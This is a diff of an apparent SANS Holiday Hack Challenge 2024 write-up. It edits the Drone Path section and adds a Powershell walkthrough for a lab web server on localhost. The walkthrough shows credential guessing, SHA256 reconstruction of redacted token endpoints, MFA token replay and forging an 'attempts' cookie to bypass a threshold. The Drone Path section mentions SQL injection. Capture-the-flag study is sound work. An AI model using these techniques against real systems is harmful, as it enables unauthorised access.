@@ -179,13 +179,13 @@ The name missing from the table `NormalList` is **Joshua**.
 
 ## Drone Path
 
-Clicking on the burger menu at the top-right corner of the frame would reveal a menu with three items - Home, FileShare and Login. The Login option brings the player to a login screen that prompts for the username and password. The FileShare page has a link to a file named `fritjolf-Path.kml`.
+Clicking on the burger menu at the top-right corner of the frame reveals a menu with three items - Home, FileShare and Login. The Login option brings the player to a login screen that prompts for the username and password. The FileShare page has a link to a file named `fritjolf-Path.kml`.
 
 For visualization, this kml file can be downloaded and then imported into Google Earth. The kml code in the file traces out a path that spells "GUMDROP1"
 
 ![Initial password](files/Act2/dronepath1.png)
 
-The filename of the kml file hints at the username for the login screen. Indeed, access can be gained with following credentials:
+The filename of the kml file hints at the username for the login screen. Indeed, access can be gained using following credentials:
 
 - Username: **fritjolf**
 - Password: **GUMDROP1**
@@ -196,7 +196,7 @@ The Workshop page has a text field for the entry of drone names. Incidentally, t
 
 ![SQL injection](files/Act2/dronepath-sqli.png)
 
-Four drones are shown in the output - ELF-HAWK, Pigeon-Lookalike-v4, FlyingZoomer and Zapper. Due to space constraint, not all comments for every drone can be displayed. Full comments can be seen in the Network tab output in the browser's developer mode for all drones:
+Four drones are shown in the output - ELF-HAWK, Pigeon-Lookalike-v4, FlyingZoomer and Zapper. Due to space constraint, not all comments for every drone can be displayed in the frame. However, full comments can be seen in the Network tab output in the browser's developer mode for all drones:
 
 ```
 {"comments":["These drones will work great to find Alabasters snowball warehouses.\n I have hid the activation code in the dataset <a href='../files/secret/ELF-HAWK-dump.csv'>ELF-HAWK-dump.csv</a>. We need to keep it safe, for now it's under /files/secret.","We need to make sure we have enough of these drones ready for the upcoming operation. \n Well done on hiding the activation code in the dataset.\n If anyone finds it, it will take them a LONG time or forever to carve the data out, preferably the LATTER."],"drone_name":"ELF-HAWK"} 
@@ -220,7 +220,7 @@ There is also a hint that suggests finding the code in the LATitude and LONGitud
 
 > We need to make sure we have enough of these drones ready for the upcoming operation. Well done on hiding the activation code in the dataset. If anyone finds it, it will take them a LONG time or forever to carve the data out, preferably the LATTER.
 
-This hint points to the `OSD.longitude` and `OSD.latitude` columns in `ELF-HAWK-dump.csv`. It should be noted that longitude values should range from -180 to 180 degrees, but there are many values in the `OSD.longitude` column that are greater than 180, suggesting that the data should be plotted on a surface without any wraparound. A [short Python script](files/Act2/plot-elf-hawk.py) using the matplotlib module can be used to plot this data:
+This hint refers to the `OSD.longitude` and `OSD.latitude` columns in `ELF-HAWK-dump.csv`. It should be noted that longitude values should range from -180 to 180 degrees, but there are many values in the `OSD.longitude` column that are greater than 180, suggesting that the data should be plotted on a surface without any wraparound. A [short Python script](files/Act2/plot-elf-hawk.py) using the matplotlib module can be used to plot this data:
 
 ```
 import pandas as pd
@@ -231,7 +231,7 @@ plt.plot( elfhawkdata.longitude,elfhawkdata.latitude)
 plt.show()
 ```
 
-The two columns has been extracted, their headers renamed and saved to a file named [`ELF-HAWK-dump-latlong.csv`](files/Act2/ELF-HAWK-dump-latlong.csv) prior to running this script. The plot generated traces out the code "**DroneDataAnalystExpertMedal**", which when entered into the text field in the Admin Console, claims the **SILVER AWARD** for this challenge.
+The two columns has been extracted, their headers renamed and saved to a file named [`ELF-HAWK-dump-latlong.csv`](files/Act2/ELF-HAWK-dump-latlong.csv) prior to running this script. The generated plot traces out the code "**DroneDataAnalystExpertMedal**", which when entered into the text field in the Admin Console, claims the **SILVER AWARD** for this challenge.
 
 ![Activation code for Silver](files/Act2/dronepath2.png)
 
@@ -241,11 +241,11 @@ The two columns has been extracted, their headers renamed and saved to a file na
 
 "Carving" is a term in computer forensics to refer to the reassembly of files from raw data fragments. The hint suggests that the TRUE and FALSE values in certain columns in `ELF-HAWK-dump.csv` may lead to the next code.
 
-There are a total of 58 columns in `ELF-HAWK-dump.csv` that consists exclusively of TRUE/FALSE strings. To reveal the code for Gold, these need to be converted to binary values (TRUE for 1 and FALSE for 0). This can be done using a spreadsheet application and the [CyberChef](https://gchq.github.io/CyberChef/) tool. First it is necessary to delete the columns that do not have TRUE/FALSE strings.
+There is a total of 58 columns in `ELF-HAWK-dump.csv` that consists exclusively of TRUE/FALSE strings. To reveal the code for Gold, these need to be converted to binary values (TRUE for 1 and FALSE for 0). This can be done using a spreadsheet application and the [CyberChef](https://gchq.github.io/CyberChef/) tool. Libreoffice is used here but any good spreadsheet should work too. First it is necessary to delete the columns that do not have TRUE/FALSE strings.
 
 ![TRUE FALSE columns](files/Act2/dronepath3.png)
 
-Then, create 58 new columns immediate to the right of this table and use a formula to populate the new cells with "1" and "0" strings according to TRUE/FALSE values in the corresponding cells. Do this for all 3273 rows of data.
+Then, create 58 new columns immediately to the right of this table and use a formula to populate the new cells with "1" and "0" strings according to TRUE/FALSE values in the corresponding cells. Do this for all 3273 rows of data.
 
 ![Populating with ones and zeros](files/Act2/dronepath4.png)
 
@@ -266,3 +266,117 @@ The file `Preparations-drone-name.csv` has not been used in the write-up for Gol
 ![The letter E](files/Act2/dronepath7.jpg)
 
 The player can then enter "ELF-HAWK" as the drone name in the Workshop to obtain `ELF-HAWK-dump.csv` and the clue for Silver. Once the codeword for Silver is obtained, a hint about an "injection" vulnerability will be dropped, and the player can go on to discover the other drone names and comments from the Workshop, eventually leading to the Gold codeword.
+
+
+## Powershell
+
+In this challenge, the player is required to run powershell commands to achieve certain objectives.
+
+![Powershell challenge](files/Act2/powershell1.png)
+
+**FOR SILVER AWARD**, there are 11 questions. Here are possible answers.
+
+1. There is a file in the current directory called 'welcome.txt'. Read the contents of this file.
+   - `type welcome.txt`
+   - `type` is an alias for the Powershell command `Get-Content`.
+2. Geez that sounds ominous, I'm sure we can get past the defense mechanisms. We should warm up our PowerShell skills. How many words are there in the file?
+   - `Get-Content ./welcome.txt | Measure-Object -Word`
+3. There is a server listening for incoming connections on this machine, that must be the weapons terminal. What port is it listening on?
+   - `netstat -a`
+   - The server is listening on port 1225.
+4. You should enumerate that webserver. Communicate with the server using HTTP, what status code do you get?
+   - `Invoke-WebRequest -Uri "http://127.0.0.1:1225"`
+5. It looks like defensive measures are in place, it is protected by basic authentication. Try authenticating with a standard admin username and password.
+   - `$username = "admin"; $password = "admin"; $securePassword = ConvertTo-SecureString -String $password -AsPlainText; $credential = [PSCredential]::new($username, $securePassword) ; Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication`
+6. There are too many endpoints here. Use a loop to download the contents of each page. What page has 138 words? When you find it, communicate with the URL and print the contents to the terminal.
+   - `$response = Invoke-WebRequest -Uri "http://127.0.0.1:1225" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication; foreach ($endpt in $response.Links) {$r = Invoke-WebRequest -Uri $endpt.href; $ct = $r.Content | Measure-Object -Word; if ($ct.Words -eq 138) {$endpt.href}  }`
+   - The above command iterates over all endpoints, queries them, compute the wordcount and output the URL when the word count is 138. The endpoint is `http://localhost:1225/endpoints/13`
+   - `$resp = Invoke-WebRequest -Uri "http://127.0.0.1:1225/endpoints/13"; $resp.Content`
+   - This prints the content to the screen.
+7. There seems to be a csv file in the comments of that page. That could be valuable, read the contents of that csv-file!
+   - `$resp = Invoke-WebRequest -Uri "http://127.0.0.1:1225/token_overview.csv" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication ; $resp.Content`
+8. Luckily the defense mechanisms were faulty! There seems to be one api-endpoint that still isn't redacted! Communicate with that endpoint!
+   - `Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication`
+9. It looks like it requires a cookie token, set the cookie and try again.
+   - `$resp = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"}; $resp.Content`
+10. Sweet we got a MFA token! We might be able to get access to the system. Validate that token at the endpoint!
+	- `$r = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"} ; $mfatokenvalue  = $r.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $allcookies = "token=5f8dd236f862f4507835b0e418907ffc" + ";mfa_token=" + $mfatokenvalue; $allcookies; $r2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$allcookies}; $r2.Content`
+	- The MFA token has an expiry time of 2 seconds and need to be supplied to the mfa_validate endpoint almost immediately after it is provided. There is a base64 encoded string in the output.
+11. That looks like base64! Decode it so we can get the final secret!
+	- `$r = Invoke-WebRequest -Uri "http://127.0.0.1:1225/tokens/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie="token=5f8dd236f862f4507835b0e418907ffc"} ; $mfatokenvalue  = $r.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $allcookies = "token=5f8dd236f862f4507835b0e418907ffc" + ";mfa_token=" + $mfatokenvalue; $allcookies; $r2 = Invoke-WebRequest -Uri "http://127.0.0.1:1225/mfa_validate/4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C" -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$allcookies}; $r2.Content -match "p>(?<encodedstring>.*)</p"; $encoded = $Matches.encodedstring; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded))`
+	- The decoded string reads "Correct Token supplied, you are granted access to the snow cannon terminal. Here is your personal password for access: SnowLeopard2ReadyForAction".
+
+There are two hints for **GOLD AWARD**:
+
+> They also mentioned this lazy elf who programmed the security settings in the weapons terminal. He created a fakeout protocol that he dubbed Elf Detection and Response "EDR". The whole system is literally that you set a threshold and after that many attempts, the response is passed through... I can't believe it. He supposedly implemented it wrong so the threshold cookie is highly likely shared between endpoints! 
+
+> I overheard some of the other elves talking. Even though the endpoints have been redacted, they are still operational. This means that you can probably elevate your access by communicating with them. I suggest working out the hashing scheme to reproduce the redacted endpoints. Luckily one of them is still active and can be tested against. Try hashing the token with SHA256 and see if you can reliably reproduce the endpoint. This might help, pipe the tokens to Get-FileHash -Algorithm SHA256.
+
+The **GOLD** challenge requires the player to set a certain cookie on one of the redacted endpoints. The second clue suggests that the redacted endpoint is obtained by hashing the token string using SHA256. Since one endpoint in unredacted, we can try this idea on the token (`5f8dd236f862f4507835b0e418907ffc`) from the Silver challenge on the Linux command line:
+
+```
+$ echo "5f8dd236f862f4507835b0e418907ffc" | sha256sum
+4216b4faf4391ee4d3e0ec53a372b2f24876ed5d124fe08e227f84d687a7e06c  -
+$ echo -n "5f8dd236f862f4507835b0e418907ffc" | sha256sum
+7fa1dad4145bc91c5354c72e540a2903e7933958914a15244e1d5af4ba005172  -
+```
+
+The output above demonstrates that a newline character needs to be added to the token string before hashing (the `-n` switch omits the newline at the end). Also. Also, the hex representation of the SHA256 hash is converted to uppercase before it is used in the URL, i.e. "`421B4...A7E06C`" instead of "`4216b4...a7e06c`".
+
+This is a part of the content of `token_overview.csv` file obtained earlier.
+
+```
+...
+cb722d0b55805cd6feffc22a9f68177d,REDACTED 
+724d494386f8ef9141da991926b14f9b,REDACTED 
+67c7aef0d5d3e97ad2488babd2f4c749,REDACTED 
+5f8dd236f862f4507835b0e418907ffc,4216B4FAF4391EE4D3E0EC53A372B2F24876ED5D124FE08E227F84D687A7E06C 
+# [*] SYSTEMLOG 
+# [*] Defence mechanisms activated, REDACTING endpoints, starting with sensitive endpoints 
+# [-] ERROR, memory corruption, not all endpoints have been REDACTED 
+# [*] Verification endpoint still active 
+# [*] http://127.0.0.1:1225/tokens/<sha256sum> 
+# [*] Contact system administrator to unlock panic mode 
+# [*] Site functionality at minimum to keep weapons active 
+```
+
+Taking the token "`67c7aef0d5d3e97ad2488babd2f4c749`" as an example, when it is SHA256-hashed with a newline, the string is "`BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60`". Hence the URL to access is `http://127.0.0.1:1225/tokens/BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60`.
+
+When this endpoint is accessed using this command below, the response warns about a fakeout threshold and token validity timeout.
+
+```
+$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; $endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; $URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; $cookiestring; $r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ; $r1.RawContent
+```
+
+![Canary Tripwire warning](files/Act2/powershell2.png)
+
+This command can be extended to access the `mfa_validate` endpoint and include the mfa_token cookie, as before. The response has a `Set-Cookie` header which contains the `attempts` and `Path` cookies. The value of the `attempts` cookie is set to `c25ha2VvaWwK01`, which is the string "snakeoil" in base64 encoded form.
+
+```
+$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; $endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; $URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; $cookiestring; $r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ;  $URL2 = "http://127.0.0.1:1225/mfa_validate/" + $endpthash; $mfatokenvalue  = $r1.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $cookiestring2 = "token=" + $tokenstring + ";mfa_token=" + $mfatokenvalue; for ($j=0; $j -le 10; $j++) {$r2 = Invoke-WebRequest -Uri $URL2 -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring2}; $r2.RawContent }
+```
+
+![Setting cookie attempts](files/Act2/powershell3.png)
+
+The "Set-Cookie" header used to send cookies from the server to the client, with the expectation that the client can send it back in response later.  The previous command can be slightly modified to include the `attempts` and `Path` cookies.
+
+```
+$tokenstring = "67c7aef0d5d3e97ad2488babd2f4c749"; $endpthash = "BAC2F3580B6491CBF26C84F5DCF343D3F48557833C79CF3EFB09F04BE0E31B60"; $URL = "http://127.0.0.1:1225/tokens/" + $endpthash; $cookiestring = "token=" + $tokenstring; $cookiestring; $r1 = Invoke-WebRequest -Uri $URL -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring} ;  $URL2 = "http://127.0.0.1:1225/mfa_validate/" + $endpthash; $mfatokenvalue  = $r1.Links | Where-Object href -like "*.*" | select -last 1 -expand href; $mfatokenvalue; $cookiestring2 = "token=" + $tokenstring + ";mfa_token=" + $mfatokenvalue + ";attempts=10; Path=/" ; for ($j=0; $j -le 10; $j++) {$r2 = Invoke-WebRequest -Uri $URL2 -Authentication Basic -Credential $credential -AllowUnencryptedAuthentication -Headers @{Cookie=$cookiestring2}; $r2.RawContent }
+```
+
+![Setting cookie attempts](files/Act2/powershell4.png)
+
+With this, the value of the `attempts` cookie has changed and **GOLD** will be awarded.
+
+
+## Snowball Showdown
+
+This is a game where the player plays against Wombley in a snowball fight. In order to play and win, the player needs to be joined by a second player. There is a single player mode where the player can practice throwing snowballs and test out any code modifications, but the game is not scored.
+
+
+## Microsoft KC7
+
+There are four sections to this challenge which revolves around using Kusto Query Language (KQL) to analyse logs from a malware incident. Completion of 2 sections gives the player a **SILVER AWARD** while completing 4 gives **GOLD**. The challenge can be accessed at <http://kc7cyber.com/go/hhc24>.
+
+
+
